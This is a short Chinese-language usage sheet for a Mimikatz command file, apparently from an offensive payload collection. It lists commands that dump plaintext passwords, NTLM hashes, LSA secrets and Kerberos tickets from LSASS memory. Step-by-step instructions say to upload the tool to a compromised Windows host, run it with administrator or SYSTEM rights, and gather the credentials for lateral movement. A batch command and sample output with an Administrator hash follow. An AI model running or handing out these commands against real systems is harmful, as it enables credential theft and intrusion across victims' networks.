## 📦 载荷使用说明：mimikatz_commands.txt

### 📝 功能说明
Windows 凭据提取神器。此文本文件包含了一系列常用的 Mimikatz 命令，用于从 LSASS 内存中提取明文密码、NTLM Hash 和 Kerberos 票据。

### ⚙️ 参数说明
```text
- `privilege::debug`：提升至调试权限
- `sekurlsa::logonpasswords`：提取内存中的明文密码和 Hash
- `lsadump::lsa /patch`：提取 LSA 密钥和 Hash
- `sekurlsa::tickets /export`：导出内存中的 Kerberos 票据
```

### 🚀 操作步骤
1. 将 Mimikatz 二进制文件上传至已攻陷的 Windows 主机。
2. 以管理员权限（或 SYSTEM 权限）运行命令行。
3. 启动 Mimikatz 并依次执行此文件中的命令，或使用重定向：`mimikatz.exe < mimikatz_commands.txt`。
4. 收集输出的凭据信息用于横向移动。

### 💻 执行样例
```cmd
# 批量执行命令并将结果保存到 output.txt
mimikatz.exe < mimikatz_commands.txt > output.txt

# 预期输出 (output.txt 内容)：
#   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
#  .## ^ ##.  "A La Vie, A L'Amour"
#  ## / \ ##  /* * *
#  ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
#  '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo) * * */
#   '#####'
# 
# mimikatz # privilege::debug
# Privilege '20' OK
# 
# mimikatz # sekurlsa::logonpasswords
# Authentication Id : 0 ; 123456 (00000000:0001e240)
# Session           : Interactive from 1
# User Name         : Administrator
# Domain            : CONTOSO
# Logon Server      : DC01
# Logon Time        : 10/24/2023 12:00:00 PM
# SID               : S-1-5-21-1234567890-1234567890-1234567890-500
#         msv :
#          [00000003] Primary
#          * Username : Administrator
#          * Domain   : CONTOSO
#          * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
```
